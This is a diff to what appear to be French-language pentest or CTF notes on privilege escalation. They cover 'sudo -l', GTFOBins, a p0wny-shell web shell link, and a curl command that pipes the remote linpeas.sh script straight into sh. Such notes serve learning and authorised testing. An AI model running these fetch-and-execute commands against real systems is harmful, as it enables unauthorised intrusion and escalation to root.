@@ -162,8 +162,12 @@ https://github.com/flozz/p0wny-shell
 
 #[PRIVESC]   
 
+    sudo -l pour voir qqchose executable en root
+    
     Linpeas pour enum les gtfobins
+      SE METTRE DANS LE TMP
       curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+      wget 
 
     gtfobins
       https://gtfobins.github.io/
